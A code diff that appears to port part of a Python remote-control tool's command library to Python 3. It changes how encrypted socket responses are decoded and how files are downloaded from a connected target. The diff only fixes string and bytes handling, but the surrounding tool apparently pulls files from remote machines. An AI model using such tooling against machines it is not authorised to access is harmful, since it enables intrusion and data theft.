@@ -17,8 +17,8 @@ def st_recvall(client, count, aes_enc=None, encryption=True):
     else:
         return decrypt(buf, aes_enc)
 
-def st_receive(client,aes_enc):
-    full_response = ""
+def st_receive(client,aes_enc, as_string=False):
+    full_response = b""
     while True:
         lengthbuf = st_recvall(client, 4, encryption=False)
         length, = struct.unpack('!i', lengthbuf)
@@ -27,6 +27,11 @@ def st_receive(client,aes_enc):
             full_response += response
         else:
             break
+    if as_string:
+        try:
+            return full_response.decode('utf-8')
+        except:
+            return full_response.decode('latin-1')
     return full_response
 
 def st_send(client, data, aes_enc):
@@ -64,7 +69,7 @@ class stitch_commands_library:
     def history_check(self):
         self.Config = ConfigParser.ConfigParser()
         self.Config.read(hist_ini)
-        self.cfgfile = open(hist_ini,'wb')
+        self.cfgfile = open(hist_ini,'w')
         if self.cli_target not in self.Config.sections():
             self.Config.add_section(self.cli_target)
             st_log.info('Connected to {} for the very first time'.format(self.cli_target))
@@ -88,7 +93,7 @@ class stitch_commands_library:
                 return False
         return True
 
-    def receive(self): return st_receive(self.client,self.aes_key)
+    def receive(self, as_string=True): return st_receive(self.client,self.aes_key, as_string=as_string)
 
     def send(self, data): return st_send(self.client,data,self.aes_key)
 
@@ -118,9 +123,9 @@ class stitch_commands_library:
         if no_error(response):
             response=self.receive()
             print('\n{}').format(response),
-            while response != st_complete:
+            while response != st_complete.decode('utf-8'):
                 response=self.receive()
-                if response != st_complete:
+                if response != st_complete.decode('utf-8'):
                     print('\b')+ response,
                 else:
                     print("\n")
@@ -185,7 +190,7 @@ class stitch_commands_library:
         dwld = f_name.split()
         dwld_contents = ''
         d_file = ''
-        d = ''
+        d = b''
         if not os.path.exists(self.cli_dwld):
             os.mkdir(self.cli_dwld)
         if len(dwld) > 0:
@@ -217,14 +222,14 @@ class stitch_commands_library:
                     download_bar = progress_bar(size)
                     download_bar.file_info()
                     with open(downld,'wb') as my_download:
-                        while d != 'download complete':
-                            d = self.receive()
+                        while d != b'download complete':
+                            d = self.receive(as_string=False)
                             if not no_error(d):
                                 self.send('exit')
                                 st_print('[!] %s\n' %d)
                                 return
                             download_bar.increment()
-                            if d != 'download complete':
+                            if d != b'download complete':
                                 my_download.write(d)
                             else:
                                 download_bar.complete()
